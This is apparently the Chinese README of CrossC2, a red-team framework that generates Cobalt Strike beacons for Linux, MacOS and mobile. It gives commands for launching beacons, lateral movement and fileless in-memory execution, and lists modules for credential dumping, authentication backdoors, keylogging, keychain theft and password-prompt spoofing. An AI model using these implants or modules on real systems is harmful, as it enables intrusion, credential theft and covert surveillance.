# CrossC2 framework

[README](README.md) | [中文文档](README_zh.md)

🚀 更快捷的生成方式，参见 **cna** 介绍 [GO📌](#cna插件方式)

🔥 **Linux** & **MacOS** 支持无文件落地从内存中加载执行 **动态库** 或 **可执行文件** [GO📖](https://gloxec.github.io/CrossC2/zh_cn/api/)

🔥 灵活自定义执行文件的数据返回类型，**端口扫描**, **屏幕截图**, **键盘记录**, **口令凭证** 等用户自定义开发实现更便捷 [GO📖](https://gloxec.github.io/CrossC2/zh_cn/api/commons.html)    ( [样例: GO📌](#CustomExtension) )

🔥 自定义通信协议 [GO📖](https://gloxec.github.io/CrossC2/zh_cn/protocol/)

🔥 现已支持横向移动 [GO📌](#横向移动:-使用方法)

🔥 现已支持从内存加载脚本 [GO📌](#内存中运行脚本)

🎉 **Android** & **iPhone** 支持 [GO📌](#Mobile)


# CrossC2 framework - 生成CobaltStrike的跨平台beacon

```
	 ▄████▄   ██▀███   ▒█████    ██████   ██████     ▄████▄   ██████▄
	▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██    ▒    ▒██▀ ▀█        ██░
	▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ░ ▓██▄      ▒▓█        █████▒
	▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒  ▒   ██▒   ▒▓▓▄ ▄█ ░▒██
	▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒▒██████▒▒   ▒ ▓███▀  ░▒▓█████▓
	░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░   ░ ░▒ ▒    ░▒ ░▓ ░░
	  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░░ ░▒  ░ ░     ░  ▒     ░ ░░ ░
	░          ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░  ░  ░  CrossC2 v2.2 @hook
	░ ░         ░         ░ ░        ░        ░     ░ ░          ░
	░                                               ░     
```

![](media/15901534124389/15985513904454.jpg)

![](media/15848885324084/15848892759774.jpg)


# Description

面向企业自身及红队人员的安全评估框架，支持CobaltStrike对其他平台(Linux/MacOS/...)的安全评估，支持自定义模块，及包含一些常用的渗透模块。

`仅做企业、组织内部自身使用，本框架具有一定脆弱性，非专业人员请勿使用，以及禁止用于非法用途及盈利等，否则造成经济损失等问题自行承担并追究其相关责任!`


|  | Windows | Linux | MacOS | iOS | Android | Embedded |
| --- | --- | --- | --- | --- | --- | --- |
| Run Env (x86) |  | √ |  |  |  |  |
| Run Env (x64) | √ | √ | √ |  |  |  |
| gen beacon (x86) |  | √ |  |  | √ |  |
| gen beacon (x64) |  | √ | √ |  |  |  |
| gen beacon (armv7) |  |  |  | ⍻  | √ |  |
| gen beacon (arm64) |  |  |  | √ | √ |  |
| gen beacon (mips[el]) |  |  |  |  |  | ⍻ |

受限说明:
* CobaltStrike: 暂时仅支持3.14最后一个版本(bug fixs), 以及4.x版本(详见cs4.1分支).
* Linux: 特别老旧的系统可以选择cna中的"Linux-GLIBC"选项（2010年左右）
* MacOS: 新系统仅支持64位程序
* iOS: sandbox 
* Embedded: only *nix
* ⍻ : 加载还在完善中

# Install & Usage

> 下载基础文件:

* **CrossC2.cna**
* **genCrossC2** `(如果操作系统是Windows, 下载genCrossC2.Win.exe)`
<details>
<summary><b>注意事项⚠️</b></summary>
genCrossC2.Win.exe 需要依赖的两个文件为`ucrtbased.dll`,`vcruntime140d.dll`。
</br>可自己安装依赖或者使用issue中提供的文件拷贝至`C:\Windows\System32`
[issue: win_sdk_dll](https://github.com/gloxec/CrossC2/issues/49#issuecomment-748630879)
</details>

1. 修改`CrossC2.cna`脚本中`CC2_PATH, CC2_BIN`路径为**真实路径**
```
3:    $CC2_PATH = "/xxx/xx/xx/"; # <-------- fix
4:    $CC2_BIN = "genCrossC2.MacOS";
```

2. 选择`Script Manager`，添加`CrossC2.cna` (如果成功安装，菜单栏会多出一项 `CrossC2`)


> 建立listener与拷贝key:

因为一些原因，目前强制只支持HTTPS beacon。

1. 复制**server上cs目录**下的 `.cobaltstrike.beacon_keys`到**本地目录**下

> 功能扩展:

1. 下载CrossC2Kit, 添加`CrossC2Kit_Loader.cna`, 包含内存加载等其它功能。(`cs4.x`版本文件管理功能缺失，必须使用此Loader来重新启用文件管理)

> 运行beacon的方法:

* 在目标上运行CrossC2插件生成的一键上线脚本
* 上传beacon至目标机器后进行赋权运行
* 为beacon设定工作目录并运行: `export CCPATH=/opt/ && /tmp/c2`
* 为beacon临时指定协议库并运行: `/tmp/c2 /tmp/c2-rebind.so`
* 为beacon临时设定C2配置: `export CCHOST=127.0.0.1 && export CCPORT=443 && /tmp/c2`


## 安装参考文档: [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/usage/)

## 自定义模块: API介绍 [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/api/)

采用内存无落地加载方式，支持动态库(.so/.dylib)以及可执行文件(ELF/MachO)。


执行时输出信息的类型可以自由指定，已预定了返回类型，可对接CS原生的返回数据类型。

<details>
<summary><b>注意事项⚠️</b></summary>
`⚠️: 虽然文件都是无落地从内存加载，但选用可执行文件(ELF/MachO)的方式在传入参数时，进程是可以在ps中查看到的，不过进程名可以自定义。`
</br>`⚠️: 关于特殊的数据类型，如密码，端口扫描结果等，请参照cs原生功能返回的信息编写，将按照正则匹配。`
</details>

<details>
<summary><b>现有扩展模块</b></summary>

1. 密码dump模块：cc2_mimipenguin 采用开源项目 MimiPenguin2.0，参见 CrossC2Kit/mimipenguin/mimipenguin.cna

2. 认证后门模块：cc2_auth, cc2_ssh sudo/su/passwd等认证后门，ssh被连接及连接其他主机的凭证都将被记录。

3. 信息收集模块：cc2_safari_dump, cc2_chrome_dump, cc2_iMessage_dump, cc2_keychain_dump 常见浏览器的访问记录，以及iMessage聊天内容与钥匙串中保存的认证凭据都将被获取。

4. 流量代理模块：cc2_frp 支持快速TCP/KCP(UDP)的反向socks5加密流量代理。

5. 键盘记录模块：cc2_keylogger 记录用户的键盘输入。

6. 网络探测模块：cc2_portscan, cc2_serverscan 进行端口扫描及服务版本扫描。

7. 权限提升模块：cc2_prompt_spoof 诱导欺骗获取用户账户密码。

8. 任务管理模块：cc2_job 管理内存中运行的模块。

9. ...

</details>


## 自定义通信协议: API介绍 [📖 Wiki](https://gloxec.github.io/CrossC2/zh_cn/protocol/)

可以更便捷的实现C2Profile配置及自定义通信协议TCP/UDP等等。 

## 横向移动

1. 生成 `Linux-bind` / `MacOS-bind` 类型的beacon
2. 内网中的目标运行 `./MacOS-bind.beacon <port>` 开启服务
3. 在网络联通的session中运行 `connect <targetIP>:<port>`

## 内存中运行脚本

<details>
<summary><b>运行示例</b></summary>

可以直接在会话中调用主机中的 **bash** / **python** / **ruby** / **perl** / **php** 等脚本解释器执行传入内存中的脚本。
`进程中不会存在任何信息，所有运行的内容皆从内存中传入解释器`
1. python c:\getsysteminfo.py
2. python import base64;print base64.b64encode('whoami'); print 'a'*40
3. php <?php phpinfo()?>

尝试加载本地脚本:
![](media/15901534124389/16041501958652.jpg)

尝试直接运行脚本语言:
![](media/15901534124389/16041502298949.jpg)

</details>

# 即将上线

1. 丰富的C2Profile支持 ✔︎ (cna生成beaocn时选择自定义HTTP模块)
2. Staged类型Shellcode生成 ✔︎ (暂时只支持Linux，并且需要在server服务器上启动stagerServer)
3. http-proxy (auth) & socks 代理回连支持
4. 流量中转支持 ✔︎ (暂时采用回连socks代理的方式)
5. node beacon? (单个节点式，可进行不依靠teamserver托管其他beacon)
6. Linux & MacOS 端so/dylib的上线支持、及其衍生的进程注入等功能

# Examples

<details>
<summary><b>Mobile</b></summary>

## Mobile
![](media/15848885324084/15848892759774.jpg)

![](media/15848885324084/15848892902723.jpg)

</details>

<details>
<summary><b>MacOS & Linux</b></summary>

## MacOS & Linux

![](media/15794884596715/15795001494711.jpg)
![](media/15824278372797/15824282351545.jpg)

</details>

<details>
<summary><b>CustomExtension</b></summary>

## CustomExtension

开发动态库，自定义数据返回类型，例如实现一些内置功能。


### 键盘记录
![](media/15854585486601/15854592406527.jpg)

### 口令凭证
![](media/15854585486601/15854601104042.jpg)

### 端口扫描
![](media/15854585486601/15854593957704.jpg)

</details>

# ChangeLog

## release v2.2.4 - stable :
* -修复 v2.2.3 的上线问题 #84 #85
* +支持 Linux支持从procfs中获取进程列表信息

## release v2.2.3 :
* -修复 修复32位Linux下打开文件管理器时beacon退出的bug
* -修复 修复多指令合并任务中`bcd`、`bls`、`bupload`等函数解析错误问题，现在可以处理与windows beacon相同的cna脚本  #81
* +支持 添加两个环境变量用于临时设置beacon连接的C2地址 (`CCHOST` & `CCPORT`)

> export CCHOST=127.0.0.1 && export CCPORT=443  && /tmp/c2

* +支持 添加bupload函数支持 https://github.com/gloxec/CrossC2/issues/81#issuecomment-841068719

## release v2.2.2 - stable:
* -修复 修复加载自定义通信协议库时导致beacon无法启动的一些bug
* +支持 新增两种强制指定beacon加载自定义通信协议库的运行方式

> 1. export CCPATH=/opt/  && /tmp/c2
(为beacon强制设定具有权限的工作目录, 例如 `/opt/`)
> 2. /tmp/c2 /tmp/c2-rebind.so
(为beacon强制指定通信协议库)

## release v2.2.1 :
* -修复 修复文件下载速度过慢的问题（现已达到满速）
* -修复 修复同时下载多个文件出现的问题（使用`downloads`命令查看进度）
* -修复 修复低版本内核系统上`/tmp/`目录文件权限默认没有执行权限，导致`beacon`无法启动的问题
* -修复 修复低版本内核系统上`beacon`反复上线时，资源被占用导致失败的问题
* -修复 修复文件落地时在低版本内核系统时遇到名称冲突，无法运行的问题

## release v2.2 :

* -变更 仅支持 CS4.x (>=4.1)，低版本后续将不再支持。
* -修复 修复通信协议重绑定在低版本Linux内核上错误的问题
* +支持 C2域名解析支持
* +支持 支持内存执行组件的持续化调用
* +支持 支持添加内存执行的shell别名，方便团队其他人直接通过shell指令调用已加载的内存执行组件
* +支持 python-import支持，像powershell-import一样为python执行提供便利
* +支持 genCrossC2生成器支持更低版本的GLIBC

<details>
<summary><b>历史版本更新说明</b></summary>

## release v2.1 :

* +支持 支持从内存中解析执行脚本
* +支持 支持CobaltStrike 4.1 (详见cs4.1分支)

## release v2.0 :

* -修复 修复文件管理处上传文件时带反斜杠导致路径出错的问题
* -修复 真实环境中多种场景下长时间测试，修复一些隐藏的问题，现在更加稳定
* +支持 更低内核版本系统的支持
* +支持 启动时环境变量自动设置
* +支持 启动时敏感env记录删除
* +支持 启动时可后台服务进程方式挂属init进程下
* +支持 增加session spawn功能
* +支持 增加session 设置环境变量的功能
* +支持 增加session getsystem权限提升功能
* +支持 增加session 处理多个合并任务的解析功能
* +支持 增加 Mac & Linux 横向移动的功能

## release v1.5 :

* -修复 修复genCrossC2的通讯协议重绑定错误

## release v1.4 :

* -修复 Linux后台进程与joblist显示错误的问题

## release v1.3 :

* +支持 支持自定义通信协议 (HTTP, TCP, UDP...) .
* +支持 新添加了joblist模块，可用来管理内存中持续运行的模块.
* +支持 添加了反向代理模块{TCP/KCP(UDP)}，同样属于内存无落地运行.


md5(genCrossC2.Linux) = 221b3ede4e78fee80f59946f116d7245

md5(genCrossC2.MacOS) = d216cad3fe3c25ead46b85c7ad7051f1

md5(genCrossC2.Win.exe) = a573506e8825b46b041ac3b9307a656b

## release v1.2 :

* +支持 可以支持选择生成beacon时所需的key文件.
* +支持 支持生成shellcode.
* -变更 不再依赖cobaltstrike.jar (意味着CrossC2插件可以放在任意位置).
* -变更 更加便捷的Unix系统上线方式.

md5(genCrossC2.Linux) = 2ef7250cc3787d3cbd1e6f99c3c434aa

md5(genCrossC2.MacOS) = eaabde94dd7fed8dabb37cd67a1171c4

md5(genCrossC2.Win.exe) = c65ac808ed3a1000b3ff4ebb8c48ea4e

## release v1.1 :

* -修复 内存加载执行功能的多国语言乱码问题修复

md5(genCrossC2.Linux) = 2347ed6e30e4655b793a6dbb4d33d25c

md5(genCrossC2.MacOS) = f530333500a76fe228864f8901af4104

md5(genCrossC2.Win.exe) = c223e31b2674a8a11d3254f92259e87a

## release v1.0 :

* -修复 真实环境中多种场景下长时间多次测试，修复一些隐藏的问题，现在更加稳定
* +支持 Linux & MacOS 支持无文件内存加载执行
* +支持 预留CS内置数据类型，更加丰富的用户自定义插件返回数据类型，可自由便捷实现'portscan'等等原生功能

md5(genCrossC2.Linux) = 12295998d4bffd5b4c4a411fb33428bb

md5(genCrossC2.MacOS) = c88ce9df47529b243e2215a866d445c5

md5(genCrossC2.Win.exe) = 51d1814f1ebbab634bce0373ceb7cee6

## release v0.4 :

* -变更 shell命令执行时采用后台多线程方式
* -变更 shell命令执行时错误输出重定向到标准输出
* +支持 增加后台文件下载功能

md5(genCrossC2.Linux) = b2e34f721ec2543b6625e33c8c2935df

md5(genCrossC2.MacOS) = 4e38a9d9a3eeff309648afc02e2e7664

## release v0.3 :

* +支持 老系统Linux上低版本GLIBC的兼容 (2010年左右)

## release v0.2 : 

* -修复 Linux genCrossC2.Linux 崩溃的bug.
* -修复 大文件上传时末尾字节写入不全的bug.
* +支持 GUI的文件管理器.

md5(genCrossC2.Linux) = 8256374d88c2149efc102aff7e90b3f9

md5(genCrossC2.MacOS) = 08fce0a5d964a091d8bf2344d7ab809e

## release v0.1 : 

* 支持 生成 Linux & MacOS beacon.

md5(genCrossC2.Linux) = f4c0cc85c7cdd096d2b7febedc037538

md5(genCrossC2.MacOS) = 79fff0505092fc2055824ed1289ce8f9


</details>







